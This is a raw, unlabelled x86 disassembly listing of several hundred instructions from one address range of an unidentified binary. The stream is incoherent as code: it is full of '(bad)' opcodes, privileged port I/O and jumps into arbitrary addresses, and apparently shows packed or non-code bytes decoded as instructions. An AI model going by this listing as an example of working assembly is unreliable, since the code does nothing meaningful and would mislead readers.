  40aba6:	pop    edi
  40aba7:	push   eax
  40aba8:	push   0xffffffa7
  40abaa:	dec    eax
  40abab:	mov    ch,0x89
  40abad:	cmp    DWORD PTR [ecx-0x727f2e73],esi
  40abb3:	sahf   
  40abb4:	sti    
  40abb5:	dec    eax
  40abb6:	pop    edi
  40abb7:	sbb    bh,0xb6
  40abba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abbb:	in     al,0xbe
  40abbd:	daa    
  40abbe:	pmaxub mm7,QWORD PTR [esi+0x1b]
  40abc2:	cmp    edx,eax
  40abc4:	loop   0x40ab6e
  40abc6:	inc    eax
  40abc7:	dec    eax
  40abc8:	add    al,0x8a
  40abca:	sbb    eax,0xae517a85
  40abcf:	jbe    0x40ac0f
  40abd1:	mov    DWORD PTR [ecx+edi*1],edx
  40abd4:	pop    ds
  40abd5:	jns    0x40abc9
  40abd7:	xor    bh,BYTE PTR [edi-0x1d]
  40abda:	scas   eax,DWORD PTR es:[edi]
  40abdb:	mov    esp,0x418d8d9f
  40abe0:	gs iret 
  40abe2:	(bad)  
  40abe3:	into   
  40abe4:	mov    esp,0xda363d98
  40abe9:	push   esi
  40abea:	in     eax,dx
  40abeb:	jnp    0x40ab98
  40abed:	aad    0x62
  40abef:	cmp    al,0x3e
  40abf1:	in     al,0x77
  40abf3:	(bad)  
  40abf4:	mov    edi,0x4deae63f
  40abf9:	leave  
  40abfa:	cdq    
  40abfb:	jae    0x40ab8c
  40abfd:	rcr    bh,1
  40abff:	fsub   DWORD PTR [esi+0x25c4dfd3]
  40ac05:	sti    
  40ac06:	les    ebp,FWORD PTR [edx-0x55dc71e1]
  40ac0c:	mov    edi,DWORD PTR [eax+0x5b]
  40ac0f:	push   esp
  40ac10:	aaa    
  40ac11:	mov    esi,0x88aca2cc
  40ac16:	jp     0x40ac8f
  40ac18:	fistp  QWORD PTR [esi-0x33]
  40ac1b:	mov    ds:0xa23ed568,al
  40ac20:	rep lods eax,DWORD PTR ds:[esi]
  40ac22:	loopne 0x40ac3a
  40ac24:	xor    eax,0x2330800
  40ac29:	xchg   DWORD PTR [ecx+0x436dfa80],ebx
  40ac2f:	mov    bh,0xd3
  40ac31:	data16 sahf 
  40ac33:	sub    eax,0x155b01a6
  40ac38:	jbe    0x40ac08
  40ac3a:	mov    dl,0x6c
  40ac3c:	push   ebp
  40ac3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac3e:	ja     0x40ac5e
  40ac40:	cwde   
  40ac41:	sub    al,0x55
  40ac43:	fdivr  DWORD PTR [ebp-0x6c]
  40ac46:	jecxz  0x40ac78
  40ac48:	adc    BYTE PTR ds:0xec1aea90,0x6c
  40ac4f:	mov    edx,DWORD PTR ss:[esi-0x3f]
  40ac53:	lds    eax,FWORD PTR [edi-0x59d319cc]
  40ac59:	leave  
  40ac5a:	pop    esi
  40ac5b:	sbb    eax,0xb41fbbfe
  40ac60:	dec    DWORD PTR [esi-0x19]
  40ac63:	pop    ebx
  40ac64:	add    eax,0xc79d4710
  40ac69:	pop    edx
  40ac6a:	aaa    
  40ac6b:	add    eax,ebp
  40ac6d:	jl     0x40acad
  40ac6f:	inc    edi
  40ac70:	inc    ebp
  40ac71:	mov    WORD PTR [ecx-0x5],es
  40ac74:	xor    al,0x60
  40ac76:	ins    DWORD PTR es:[edi],dx
  40ac77:	xor    al,0x97
  40ac79:	scas   eax,DWORD PTR es:[edi]
  40ac7a:	dec    esp
  40ac7b:	adc    BYTE PTR [edx-0x7c],dh
  40ac7e:	adc    dh,dl
  40ac80:	mov    cl,0xfb
  40ac82:	jmp    0xc00b:0x91ec8f58
  40ac89:	loop   0x40acb4
  40ac8b:	mov    ebp,0x41023970
  40ac90:	or     DWORD PTR [ebp+0x68080a8d],ebp
  40ac96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac97:	mov    cl,BYTE PTR [esi-0x25]
  40ac9a:	cdq    
  40ac9b:	add    DWORD PTR [ecx+0x61],ebx
  40ac9e:	mov    al,0x21
  40aca0:	mov    eax,ds:0xdaebd6a7
  40aca5:	cli    
  40aca6:	out    dx,eax
  40aca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca8:	fdivr  DWORD PTR [esi+0x53]
  40acab:	and    DWORD PTR [edx-0x438e923a],esp
  40acb1:	push   esp
  40acb2:	inc    esi
  40acb3:	pop    ss
  40acb4:	and    eax,0x71f11a98
  40acb9:	xchg   esi,eax
  40acba:	jp     0x40ac9a
  40acbc:	mov    edi,0xcaaefc58
  40acc1:	add    eax,0xd3e08060
  40acc6:	add    BYTE PTR [ecx],cl
  40acc8:	(bad)  
  40acca:	shr    BYTE PTR [ecx-0x2035030d],0x39
  40acd1:	(bad)  
  40acd2:	and    ecx,DWORD PTR [edi]
  40acd4:	lahf   
  40acd5:	scas   al,BYTE PTR es:[edi]
  40acd6:	jmp    0x128f:0xbc29a8f3
  40acdd:	and    DWORD PTR [esp+edi*4+0x5f],ebx
  40ace1:	imul   ecx,ebp,0xffffff97
  40ace4:	mov    edi,0xf9df2cf2
  40ace9:	fimul  WORD PTR [ebp+0x76]
  40acec:	dec    esi
  40aced:	jge    0x40ac7f
  40acef:	(bad)  
  40acf0:	loope  0x40ad1b
  40acf2:	push   es
  40acf3:	sbb    esp,DWORD PTR [edi]
  40acf5:	dec    eax
  40acf6:	xchg   edx,eax
  40acf7:	into   
  40acf8:	mov    ds:0x5c7babae,al
  40acfd:	fdiv   st(6),st
  40acff:	add    dl,0xc7
  40ad02:	iret   
  40ad03:	sbb    bl,BYTE PTR [ebx+0x35]
  40ad06:	push   ecx
  40ad07:	out    dx,eax
  40ad08:	cs pushf 
  40ad0a:	xor    DWORD PTR [eax+0x653f23c0],esi
  40ad10:	pushf  
  40ad11:	aas    
  40ad12:	into   
  40ad13:	js     0x40ad25
  40ad15:	(bad)  
  40ad16:	outs   dx,BYTE PTR ds:[esi]
  40ad17:	mov    ss,WORD PTR [ebp+0x3a308d97]
  40ad1d:	sar    bh,1
  40ad1f:	fcom   DWORD PTR [edi]
  40ad21:	and    BYTE PTR [esi+eax*8+0x1cb4bd58],ch
  40ad28:	pop    eax
  40ad29:	sub    al,0xcd
  40ad2b:	test   eax,0xba3aa2c0
  40ad30:	imul   BYTE PTR [ebx+0x2babfabf]
  40ad36:	out    0x8,eax
  40ad38:	mov    edi,0x61c725f
  40ad3d:	push   eax
  40ad3e:	fnstsw WORD PTR [ebp+0x59]
  40ad41:	xchg   esi,eax
  40ad42:	pusha  
  40ad43:	sub    eax,0xd3e450a2
  40ad48:	cmp    BYTE PTR [edi],0xfa
  40ad4b:	jg     0x40ad4b
  40ad4d:	or     eax,0x46b125b2
  40ad52:	push   esp
  40ad53:	xchg   ebp,eax
  40ad54:	mov    bl,0x6a
  40ad56:	je     0x40ad2f
  40ad58:	fld    QWORD PTR [edx+0x76]
  40ad5b:	(bad)  
  40ad5c:	xchg   ecx,eax
  40ad5d:	jnp    0x40ad50
  40ad5f:	add    esp,eax
  40ad61:	fucomi st,st(6)
  40ad63:	je     0x40ad83
  40ad65:	(bad)  
  40ad66:	jl     0x40adb0
  40ad68:	sub    DWORD PTR [ecx],ebp
  40ad6a:	mov    ch,0x26
  40ad6c:	mov    DWORD PTR [esi-0x5a],esp
  40ad6f:	or     ebx,esi
  40ad71:	add    bl,BYTE PTR [esp+ebx*1]
  40ad74:	in     al,dx
  40ad75:	jae    0x40ad5a
  40ad77:	xchg   esi,eax
  40ad78:	rcr    edx,0xd4
  40ad7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad7c:	add    BYTE PTR [edi],ch
  40ad7e:	inc    edx
  40ad7f:	sub    BYTE PTR [esi+0x5d],0x82
  40ad83:	rol    BYTE PTR [ebx],1
  40ad85:	push   ebx
  40ad86:	cmp    DWORD PTR [ebx],eax
  40ad88:	sbb    ecx,0x69
  40ad8b:	add    DWORD PTR [edi+esi*1+0x2078c91],eax
  40ad92:	fisttp WORD PTR [edx]
  40ad94:	xchg   ebp,eax
  40ad95:	adc    dh,BYTE PTR [ebx+edi*4+0xe]
  40ad99:	add    al,0xe6
  40ad9b:	cdq    
  40ad9c:	es (bad) 
  40ad9e:	jp     0x40ada5
  40ada0:	daa    
  40ada1:	xor    DWORD PTR [ebp+0x6f],ebx
  40ada4:	int3   
  40ada5:	push   ds
  40ada6:	dec    esp
  40ada7:	lods   al,BYTE PTR ds:[esi]
  40ada8:	les    ecx,FWORD PTR [ebp+0x53]
  40adab:	and    BYTE PTR [edx-0x53],ch
  40adae:	add    BYTE PTR ss:[eax+0x73],cl
  40adb2:	jl     0x40adf5
  40adb4:	pusha  
  40adb5:	sub    eax,0x3d09871
  40adba:	push   eax
  40adbb:	or     eax,0x81519a7c
  40adc0:	sub    ch,al
  40adc2:	sbb    bl,cl
  40adc4:	inc    esi
  40adc5:	idiv   DWORD PTR [edx]
  40adc7:	mov    edi,0x3e52b7f2
  40adcc:	stc    
  40adcd:	pop    edi
  40adce:	cmp    eax,0xa8ea5286
  40add3:	test   BYTE PTR [esi-0xa0e75c5],dl
  40add9:	lods   al,BYTE PTR ds:[esi]
  40adda:	xchg   esp,eax
  40addb:	loop   0x40ad62
  40addd:	outs   dx,DWORD PTR ds:[esi]
  40adde:	mov    edi,0xf8ff97c4
  40ade3:	and    eax,0x61ef9bfa
  40ade8:	arpl   WORD PTR [edx+ecx*4-0x22],si
  40adec:	pusha  
  40aded:	pop    es
  40adee:	xchg   ebp,eax
  40adef:	not    al
  40adf1:	mov    BYTE PTR [esi+0x2a],0xbd
  40adf5:	sar    BYTE PTR [eax-0x4f],1
  40adf8:	test   al,0xfa
  40adfa:	or     al,BYTE PTR [ebp+eax*2+0x5e2d0265]
  40ae01:	lea    edi,[ebx]
  40ae03:	push   0xffffffc1
  40ae05:	pop    esp
  40ae06:	stos   DWORD PTR es:[edi],eax
  40ae07:	(bad)  
  40ae08:	cmp    eax,0x76a21e6a
  40ae0d:	out    dx,al
  40ae0e:	inc    ebp
  40ae0f:	fistp  DWORD PTR [eax+0x20]
  40ae12:	lds    esi,FWORD PTR [edx+0x5b]
  40ae15:	stos   BYTE PTR es:[edi],al
  40ae16:	xchg   esp,eax
  40ae17:	aas    
  40ae18:	mov    ds:0xba0965ff,al
  40ae1d:	mov    ah,0x6c
  40ae1f:	hlt    
  40ae20:	sub    al,0x52
  40ae22:	les    eax,FWORD PTR [eax-0x1d]
  40ae25:	out    dx,eax
  40ae26:	aad    0xb7
  40ae28:	scas   eax,DWORD PTR es:[edi]
  40ae29:	rcl    BYTE PTR [eax+0x2af1e3c6],0x47
  40ae30:	jmp    0xc1f02a2e
  40ae35:	mov    bh,0x27
  40ae37:	(bad)  
  40ae38:	int    0x4
  40ae3a:	je     0x40aea5
  40ae3c:	pushf  
  40ae3d:	inc    edx
  40ae3e:	mov    edx,0x9fdecdf5
  40ae43:	mov    cl,0xf3
  40ae45:	mov    eax,ds:0x75e4d90e
  40ae4a:	out    0x2f,al
  40ae4c:	sbb    ecx,esp
  40ae4e:	in     eax,dx
  40ae4f:	push   cs
  40ae50:	sbb    BYTE PTR [ecx+0x5285056c],al
  40ae56:	mov    ah,0xdb
  40ae58:	sub    eax,0x4cc70f0e
  40ae5d:	es xchg ebx,eax
  40ae5f:	call   0x773d:0x92f7e2d
  40ae66:	push   ebx
  40ae67:	call   0x9381314f
  40ae6c:	xchg   esi,eax
  40ae6d:	ret    0x6d02
  40ae70:	lea    esi,[ecx]
  40ae72:	in     al,0x59
  40ae74:	out    0x22,al
  40ae76:	add    ch,bh
  40ae78:	jle    0x40ae7f
  40ae7a:	repz (bad) 
  40ae7c:	das    
  40ae7d:	xor    dh,BYTE PTR [ecx-0x17]
  40ae80:	repnz add eax,0xc402de6e
  40ae86:	bound  ecx,QWORD PTR [ebx+eax*4-0x6c]
  40ae8a:	mov    eax,ds:0x29cad8b9
  40ae8f:	push   ebp
  40ae90:	cmp    DWORD PTR [ecx],edi
  40ae92:	ret    
  40ae93:	sbb    DWORD PTR [edx-0x40111360],0x6d
  40ae9a:	int3   
  40ae9b:	dec    ebp
  40ae9c:	and    eax,0x97eda584
  40aea1:	adc    eax,0x4a0acd9f
  40aea6:	ins    DWORD PTR es:[edi],dx
  40aea7:	rcl    BYTE PTR [ebp-0x4dd630ed],1
  40aead:	xchg   esp,eax
  40aeae:	call   0x1321:0x6548144
  40aeb5:	(bad)  
  40aeb7:	add    al,0xd5
  40aeb9:	ret    0x3547
  40aebc:	rol    BYTE PTR ss:[esp+ecx*4],1
  40aec0:	mov    BYTE PTR [edx+0xac10c87],ch
  40aec6:	sub    esp,DWORD PTR [edx+0x2690801c]
  40aecc:	sbb    al,0xa8
  40aece:	jg     0x40af35
  40aed0:	jbe    0x40af06
  40aed2:	xor    cl,BYTE PTR [edx]
  40aed4:	sub    edx,DWORD PTR [eax]
  40aed6:	jo     0x40ae79
  40aed8:	shl    DWORD PTR [esi+0x3a],0xe7
  40aedc:	scas   eax,DWORD PTR es:[edi]
  40aedd:	std    
  40aede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aedf:	cmp    edi,edi
  40aee1:	cmc    
  40aee2:	das    
  40aee3:	jle    0x40ae75
  40aee5:	jbe    0x40aea2
  40aee7:	jne    0x40aeb0
  40aee9:	sahf   
  40aeea:	outs   dx,BYTE PTR ds:[esi]
  40aeeb:	xchg   ebp,eax
  40aeec:	add    al,0x1a
  40aeee:	sub    al,0xa5
  40aef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aef1:	shr    ecx,cl
  40aef3:	jo     0x40aef2
  40aef5:	cli    
  40aef6:	sub    eax,0x5ff3f77e
  40aefb:	daa    
  40aefc:	aaa    
  40aefd:	fucomi st,st(4)
  40aeff:	ins    BYTE PTR es:[edi],dx
  40af00:	sahf   
  40af01:	mov    ds:0xdda1dfdb,eax
  40af06:	sbb    DWORD PTR [edx-0x4],esp
  40af09:	mov    al,ds:0x5f7d1aa9
  40af0e:	mov    eax,0x72bd179c
  40af13:	int3   
  40af14:	ss push ss
  40af16:	push   edi
  40af17:	and    DWORD PTR [eax+0x528188a5],eax
  40af1d:	les    ecx,FWORD PTR [esi-0xa6ae4c1]
  40af23:	inc    eax
  40af24:	and    BYTE PTR [edx-0x17],al
  40af27:	sbb    BYTE PTR [edx+eax*1],ah
  40af2a:	int    0x8b
  40af2c:	cdq    
  40af2d:	es push 0xcfe39c23
  40af33:	jg     0x40aebf
  40af35:	adc    cl,BYTE PTR [edx-0x6815ccae]
  40af3b:	or     dl,bl
  40af3d:	mov    ch,0xe7
  40af3f:	lea    edi,[edi+0x15c021c7]
  40af45:	sbb    eax,0x21abbd5
  40af4a:	test   bl,ah
  40af4c:	add    eax,eax
  40af4e:	sub    eax,esi
  40af50:	or     DWORD PTR [esi],edi
  40af52:	dec    ecx
  40af53:	mov    ebp,ebx
  40af55:	pop    ds
  40af56:	mov    edi,0x3397fb48
  40af5b:	jle    0x40af4e
  40af5d:	addr16 aas 
  40af5f:	rol    DWORD PTR [ebx-0x8736c7d],0x27
  40af66:	mov    esp,0x7c1ba5fe
  40af6b:	sti    
  40af6c:	pop    edi
  40af6d:	in     eax,dx
  40af6e:	xor    DWORD PTR [ebp+0x524242e0],edi
  40af74:	mov    edx,0xbad6afd8
  40af79:	repnz add DWORD PTR [edx+ebp*2-0x43cc08e4],ebp
  40af81:	ja     0x40afba
  40af83:	cmp    ebx,DWORD PTR [edi]
  40af85:	ja     0x40af22
  40af87:	fild   QWORD PTR [ebp+0x200000]
  40af8d:	dec    ecx
  40af8e:	inc    esp
  40af8f:	inc    ecx
  40af90:	push   esp
  40af91:	push   esi
  40af92:	fwait
  40af93:	add    edx,DWORD PTR [edx-0x46]
  40af96:	pop    ecx
  40af97:	outs   dx,BYTE PTR ds:[esi]
  40af98:	stos   BYTE PTR es:[edi],al
  40af99:	xchg   ebp,eax
  40af9a:	pop    ecx
  40af9b:	and    esp,DWORD PTR [edi-0x23d965a2]
  40afa1:	mov    eax,0xb1839b71
  40afa6:	hlt    
  40afa7:	mov    ecx,0xc5f95e36
  40afac:	loop   0x40af88
  40afae:	jno    0x40afb8
  40afb0:	mov    al,0xb2
  40afb2:	int3   
  40afb3:	in     eax,dx
  40afb4:	bound  edi,QWORD PTR [edi]
  40afb6:	mov    esi,0x4066c541
  40afbb:	call   0x74d3448f
  40afc0:	cmp    cl,BYTE PTR [edx-0x46af5a4c]
  40afc6:	inc    esi
  40afc7:	jnp    0x40af96
  40afc9:	xchg   esi,eax
  40afca:	adc    cl,BYTE PTR [esi-0x63]
  40afcd:	enter  0xb538,0x93
  40afd1:	jno    0x40afc9
  40afd3:	mov    ah,0xe5
  40afd5:	shl    DWORD PTR [ebx+0x7d],0xba
  40afd9:	fld    QWORD PTR [ecx+esi*8+0x4b85ce61]
  40afe0:	xchg   DWORD PTR [edi+ebp*8+0x15],edi
  40afe4:	retf   
  40afe5:	cmc    
  40afe6:	fst    QWORD PTR [ebx]
  40afe8:	push   0xbd95d693
  40afed:	xchg   edx,eax
  40afee:	js     0x40af8c
  40aff0:	and    BYTE PTR [eax+0x39],0x2a
  40aff4:	ror    BYTE PTR [esp+esi*1-0xa6a3dd4],1
  40affb:	jmp    0x77206c2
  40b000:	pop    es
  40b001:	add    bl,BYTE PTR [edi]
  40b003:	jp     0x40b001
  40b005:	push   es
  40b006:	mov    edi,0xc63ddff1
  40b00b:	mov    ecx,0x50b83bb3
  40b010:	loopne 0x40affc
  40b012:	icebp  
  40b013:	push   ds
  40b014:	icebp  
  40b015:	cmp    ebp,DWORD PTR [ecx+0x6e]
  40b018:	mov    bh,0xd6
  40b01a:	in     eax,0x59
  40b01c:	in     al,0x79
  40b01e:	into   
  40b01f:	pop    ss
  40b020:	push   eax
  40b022:	jmp    0x40afe0
  40b024:	jne    0x40afdf
  40b026:	in     al,0xf4
  40b028:	fld    DWORD PTR [edi-0x18]
  40b02b:	je     0x40afe4
  40b02d:	call   0x6498f6a6
  40b032:	ins    DWORD PTR es:[edi],dx
  40b033:	mov    edx,0x38588475
  40b038:	hlt    
  40b039:	in     al,dx
  40b03a:	adc    BYTE PTR [ecx+0x6b30d108],0x44
  40b041:	add    eax,DWORD PTR [esp+edi*1]
  40b044:	js     0x40afcf
  40b046:	lds    ecx,FWORD PTR [ebx-0x4d13557]
  40b04c:	or     ebp,DWORD PTR [edx+eax*8]
  40b04f:	out    dx,eax
  40b050:	pop    edi
  40b051:	dec    esp
  40b052:	sbb    eax,0xb72a226
  40b057:	xchg   esi,eax
  40b058:	pop    ss
  40b059:	jl     0x40b05b
  40b05b:	aad    0x78
  40b05d:	add    ch,ch
  40b05f:	xchg   BYTE PTR [eax+0x1b],cl
  40b062:	pop    ebp
  40b063:	mov    ds:0xdba94664,al
  40b068:	xor    eax,0x96d9bf7b
  40b06d:	(bad)
  40b071:	mov    ebx,0x6384021c
  40b076:	data16 add al,BYTE PTR [edx-0x125261ad]
  40b07d:	ins    DWORD PTR es:[edi],dx
  40b07e:	push   ds
  40b07f:	mov    esi,0xff9718f9
  40b084:	hlt    
  40b085:	adc    eax,0xa79faebe
  40b08a:	test   DWORD PTR [ecx-0x49d8cf1],0xdffd3f24
  40b094:	hlt    
  40b095:	imul   ebp,DWORD PTR [edi+0x5c],0xf8ff4be2
  40b09c:	xor    dl,bl
  40b09e:	leave  
  40b09f:	add    al,0xa5
  40b0a1:	jmp    0x4ab0:0x1551c026
  40b0a8:	mov    ds,WORD PTR [ebx]
  40b0aa:	cli    
  40b0ab:	imul   ebp,esi,0xfffffff7
  40b0ae:	idiv   DWORD PTR [edi+ecx*8-0x29]
  40b0b2:	push   edx
  40b0b3:	dec    edx
  40b0b4:	xchg   ecx,eax
  40b0b5:	sti    
  40b0b6:	mov    DWORD PTR [eax+0x63],eax
  40b0b9:	inc    edx
  40b0ba:	sbb    eax,0xaf57821c
  40b0bf:	fisub  WORD PTR [edx+0x3e]
  40b0c2:	in     eax,dx
  40b0c3:	inc    eax
  40b0c4:	push   0xffffff91
  40b0c6:	sbb    BYTE PTR [edx],0x0
  40b0c9:	xor    al,0xf3
  40b0cb:	aaa    
  40b0cc:	stos   BYTE PTR es:[edi],al
  40b0cd:	outs   dx,BYTE PTR ss:[esi]
  40b0cf:	pop    ss
  40b0d0:	and    DWORD PTR [eax-0x7c],eax
  40b0d3:	ret    0x51fa
  40b0d6:	and    eax,0x45431ae
  40b0db:	adc    al,0x29
  40b0dd:	mov    eax,ds:0xb4e84add
  40b0e2:	adc    esp,DWORD PTR [esi-0x2d]
  40b0e5:	sbb    BYTE PTR [ebx+ecx*8],0xc6
  40b0e9:	pusha  
  40b0ea:	into   
  40b0eb:	pop    es
  40b0ec:	sahf   
  40b0ed:	enter  0x2bf8,0x9f
  40b0f1:	cmp    al,cl
  40b0f3:	inc    edi
  40b0f4:	jg     0x40b0e0
  40b0f6:	jge    0x40b094
  40b0f8:	cmp    DWORD PTR [ebx-0x542850b3],esi
  40b0fe:	sahf   
  40b0ff:	sub    eax,0xf85e73cf
  40b104:	idiv   BYTE PTR [ecx-0x2]
  40b107:	out    dx,eax
  40b108:	jg     0x40b101
  40b10a:	jge    0x40b10a
  40b10c:	in     al,0xb9
  40b10e:	cs sar esp,cl
  40b111:	add    al,0x96
  40b113:	push   es
  40b114:	or     ah,al
  40b116:	push   cs
  40b117:	ret    
  40b118:	mov    dl,BYTE PTR [edx]
  40b11a:	inc    edi
  40b11b:	mov    ebp,0xb35fd859
  40b120:	and    ah,dl
  40b122:	sahf   
  40b123:	xor    BYTE PTR [edx],dh
  40b125:	adc    ebp,DWORD PTR [edx]
  40b127:	jg     0x40b0e9
  40b129:	ret    0xb829
  40b12c:	xor    edi,DWORD PTR [esi+ecx*8+0x6edff0ff]
  40b133:	lock in al,0x13
  40b136:	sub    esp,DWORD PTR [bx+si-0x4191]
  40b13b:	(bad)  
  40b13c:	out    0xff,al
  40b13e:	or     BYTE PTR es:[ebp+eiz*2-0x1edb6d44],al
  40b146:	imul   ebx,DWORD PTR [edi-0x1],0x33
  40b14a:	(bad)  
  40b14b:	in     al,0xeb
  40b14d:	scas   eax,DWORD PTR es:[edi]
  40b14e:	xor    ebx,edx
  40b150:	jp     0x40b191
  40b152:	std    
  40b153:	lea    edx,[ebx]
  40b155:	hlt    
  40b156:	jp     0x40b1b3
  40b158:	dec    eax
  40b159:	fptan  
  40b15b:	cmc    
  40b15c:	sbb    eax,DWORD PTR [ebx-0x1d394065]
  40b162:	addr16 cmc 
  40b164:	pop    esp
  40b165:	mov    ebx,DWORD PTR [esi]
  40b167:	jge    0x40b18a
  40b169:	cmc    
  40b16a:	mov    ds:0x14223cee,al
  40b16f:	or     al,0xe0
  40b171:	dec    eax
  40b172:	add    BYTE PTR [ecx-0x7bd05e46],al
  40b178:	lea    esp,[edx]
  40b17a:	mov    al,ds:0x8f08c075
  40b17f:	loope  0x40b1c7
  40b181:	call   FWORD PTR [ecx-0x41]
  40b184:	sbb    BYTE PTR [eax+0x462dfff0],ch
  40b18a:	imul   edx,edx,0x46
  40b18d:	push   cs
  40b18e:	inc    eax
  40b18f:	nop
  40b190:	push   eax
  40b191:	pop    es
  40b192:	dec    edx
  40b193:	sub    esi,esi
  40b195:	div    edi
  40b197:	push   edi
  40b198:	test   DWORD PTR [eax],eax
  40b19a:	xor    eax,0xbbd0206e
  40b19f:	sub    al,bh
  40b1a1:	sahf   
  40b1a2:	adc    al,0x54
  40b1a4:	imul   ecx,ebp,0xffffffe9
  40b1a7:	mov    bl,0xa7
  40b1a9:	clc    
  40b1aa:	in     al,dx
  40b1ab:	pop    es
  40b1ac:	jg     0x40b137
  40b1ae:	aaa    
  40b1af:	iret   
  40b1b0:	mov    edi,0x5e67a5ce
  40b1b5:	jecxz  0x40b212
  40b1b7:	iret   
  40b1b8:	mov    esp,0x31b1e0c4
  40b1bd:	daa    
  40b1be:	jg     0x40b162
  40b1c0:	dec    edi
  40b1c1:	push   DWORD PTR [ecx+0x38]
  40b1c4:	stc    
  40b1c5:	dec    ecx
  40b1c6:	mov    DWORD PTR [esi+0xd2c6883],ebx
  40b1cc:	jnp    0x40b1aa
  40b1ce:	inc    ecx
  40b1cf:	cmp    al,bh
  40b1d1:	fst    st(6)
  40b1d3:	fmul   QWORD PTR [edi]
  40b1d5:	jne    0x40b1e7
  40b1d7:	cmp    BYTE PTR [edx-0xc207bfb],cl
  40b1dd:	fxch   st(4)
  40b1df:	das    
  40b1e0:	adc    DWORD PTR [esi-0x63],ebx
  40b1e3:	add    al,0x21
  40b1e5:	and    eax,0x3cde6ac6
  40b1ea:	jg     0x40b207
  40b1ec:	inc    esp
  40b1ed:	(bad)  
  40b1ef:	icebp  
  40b1f0:	stc    
  40b1f1:	inc    DWORD PTR [edx]
  40b1f3:	mov    eax,ds:0x1a061ba4
  40b1f8:	xchg   esi,eax
  40b1f9:	xor    ecx,DWORD PTR [ebx]
  40b1fb:	jg     0x40b201
  40b1fd:	xchg   ebp,eax
  40b1fe:	push   ebx
  40b1ff:	rcl    BYTE PTR [edx],1
  40b201:	sbb    cl,BYTE PTR [edx-0x7bb3e361]
  40b207:	mov    al,0xa1
  40b209:	add    al,0xab
  40b20b:	mov    cl,0x3e
  40b20d:	mov    esi,ss
  40b20f:	outs   dx,BYTE PTR ds:[esi]
  40b210:	dec    ecx
  40b211:	cli    
  40b212:	jge    0x40b1d9
  40b214:	je     0x40b1c0
  40b216:	sbb    BYTE PTR [esi+0x4c],ch
  40b219:	stc    
  40b21a:	stos   DWORD PTR es:[edi],eax
  40b21b:	jg     0x40b276
  40b21d:	icebp  
  40b21e:	ja     0x40b21e
  40b220:	out    0xd3,al
  40b222:	cmp    al,0xfe
  40b224:	sahf   
  40b225:	inc    edi
  40b226:	stos   DWORD PTR es:[edi],eax
  40b227:	in     eax,0xad
  40b229:	jecxz  0x40b1e3
  40b22b:	mov    edx,0x1f079294
  40b230:	jl     0x40b1c2
  40b232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b233:	aas    
  40b234:	cli    
  40b235:	pop    esi
  40b236:	(bad)  
  40b237:	(bad)  
  40b239:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23b:	cld    
  40b23c:	pop    edi
  40b23d:	push   esi
  40b23f:	dec    ebp
  40b240:	fidivr WORD PTR [edx-0x5939ef0a]
  40b246:	sub    al,0xa5
  40b248:	out    dx,al
  40b249:	scas   al,BYTE PTR es:[edi]
  40b24a:	or     al,0xfd
  40b24c:	stc    
  40b24d:	push   esi
  40b24e:	mov    ebp,0xa231d972
  40b253:	std    
  40b254:	push   ds
  40b255:	push   esp
  40b256:	ret    0xf3e
  40b259:	adc    bl,BYTE PTR [ebp+0x7e67ce56]
  40b25f:	es out 0xb3,eax
  40b262:	lahf   
  40b263:	dec    BYTE PTR [ecx-0x46]
  40b266:	fnsave [esi+0x6d]
  40b269:	inc    edx
  40b26a:	retf   
  40b26b:	push   ebp
  40b26c:	mov    ebp,0xb1cf5c7c
  40b271:	dec    eax
  40b272:	sub    ecx,ebp
  40b274:	jbe    0x40b231
  40b276:	pop    esp
  40b277:	mov    esi,0xffcf9572
  40b27c:	(bad)  
  40b27d:	aaa    
  40b27e:	mov    cl,0xea
  40b280:	xor    al,0xfd
  40b282:	loope  0x40b2dd
  40b284:	pop    edx
  40b285:	popf   
  40b286:	dec    ebp
  40b287:	fs shl cl,cl
  40b28a:	jmp    0x40b2c7
  40b28c:	xor    al,0x7a
  40b28e:	hlt    
  40b28f:	enter  0xb10d,0xe8
  40b293:	mov    eax,0xcfbc9445
  40b298:	inc    edx
  40b299:	shr    DWORD PTR [ebx+0x503675fd],0xa9
  40b2a0:	mov    dl,0x8
  40b2a2:	adc    al,0xbf
  40b2a4:	jmp    0x44f3ac4
  40b2a9:	outs   dx,DWORD PTR ds:[esi]
  40b2aa:	les    esp,FWORD PTR ds:[esi-0x39]
  40b2ae:	add    al,al
  40b2b0:	lods   eax,DWORD PTR ds:[esi]
  40b2b1:	jne    0x40b25c
  40b2b3:	fsubr  QWORD PTR [esi+0x65]
  40b2b6:	fs mov bh,0x66
  40b2b9:	bound  ebx,QWORD PTR [ecx+0x4a]
  40b2bc:	mov    al,0x13
  40b2be:	inc    esi
  40b2bf:	ret    
  40b2c0:	xor    BYTE PTR [esi-0x7f4e575c],cl
  40b2c6:	push   eax
  40b2c7:	aaa    
  40b2c8:	dec    edx
  40b2c9:	sub    DWORD PTR [edx-0xf759a94],esi
  40b2cf:	xchg   esp,eax
  40b2d0:	pop    ds
  40b2d1:	and    eax,0x1382013
  40b2d6:	sub    DWORD PTR ds:0xf119da3d,0x53
  40b2dd:	cmp    ecx,DWORD PTR [edi-0xd]
  40b2e0:	mov    eax,ds:0x7a5ca3e2
  40b2e5:	jmp    0x40b319
  40b2e7:	scas   eax,DWORD PTR es:[edi]
  40b2e8:	mov    ebp,0xbfd732f8
  40b2ed:	jp     0x40b278
  40b2ef:	pop    ebx
  40b2f0:	rep stos DWORD PTR es:[edi],eax
  40b2f2:	int3   
  40b2f3:	scas   al,BYTE PTR es:[edi]
  40b2f4:	es and al,0x3f
  40b2f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2f8:	nop
  40b2f9:	push   edx
  40b2fa:	xchg   ecx,eax
  40b2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2fc:	sub    eax,0x46551084
  40b301:	pop    eax
  40b302:	nop
  40b303:	jecxz  0x40b2fd
  40b305:	add    dh,ch
  40b307:	gs pop ebx
  40b309:	mov    eax,0x503d55b7
  40b30e:	repz cmp dh,cl
